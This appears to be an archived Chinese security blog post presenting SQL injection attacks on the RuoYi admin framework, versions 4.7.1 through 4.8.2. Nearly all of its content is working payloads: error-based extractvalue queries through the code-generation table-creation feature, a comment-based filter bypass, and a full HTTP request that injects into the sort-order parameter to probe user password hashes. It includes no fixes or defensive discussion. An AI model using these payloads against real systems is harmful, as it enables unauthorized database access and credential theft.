---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  RuoYi 后台SQL注入漏洞系列2  
安全艺术  安全艺术   2026-01-09 08:50  
  
# 1. RuoYi（4.7.1-4.7.4）  
## 1.1. SQL注入  
  
代码生成-创建  
```
CREATE table a1 as SELECT extractvalue(1,concat(0x7e,(select database())));
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp8ZlnXxsAmO3Pe4YGQeX2ZUZAlEiayFgD0ewXzicaYhvyqiayMlMviaEXNA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpxXxU0OJFxtRwwAoQzTXnWpXyrpTVueiaIgJHLg46GJXmedLmI5c7PmQ/640?wx_fmt=png&from=appmsg "")  
# 2. RuoYi-4.7.5  
## 2.1. SQL注入  
  
代码生成-创建  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp9xEyPfjY2VSY4xDKU7axUZyS4EZ26wUiaFqhSxFU0FjH7IE71fVAtxw/640?wx_fmt=png&from=appmsg "")  
  
绕过  
```
CREATE table a1 as SELECT/**/extractvalue(1,concat(0x7e,(select/**/database())));
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpr6INqH5QEabcPaokHoJHKURdDYg5WZhfHplK0h7vwyIE3qql2oyX1Q/640?wx_fmt=png&from=appmsg "")  
# 3. RuoYi-4.8.2  
## 3.1. SQL注入  
```
POST /system/user/list HTTP/1.1
Host: 192.168.3.102
Content-Length: 147
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
X-CSRF-Token: yneu6NWAntf9M703Tou1JfwSF79sF9YSzrqFCT9wmL0=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.3.102
Referer: http://192.168.3.102/tool/gen/createTable
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=0627cca5-d25b-4156-8f9e-b48eb4d0d1ea
Connection: keep-alive

pageNum=1&pageSize=10&orderByColumn=status&isAsc=,CASE WHEN u.user_id LIKE 2 THEN CASE WHEN u.password LIKE 0x24326125 THEN 0 ELSE 2 END ELSE 1 END
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp7ODRRNtAL8rbIdZjRDjSJ6AzgGzaHlWUVggqDMShay5wurDY4syIyA/640?wx_fmt=png&from=appmsg "")  
  
更多内容进群了解哈。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OrPlho8vhCVYz7j2m9wiatMmeKTk7X3xzTFjnTrkSiaLqCMmByZxL4Z15HXV5R0Da0n6kKJSDwicLzuQ/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=24 "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
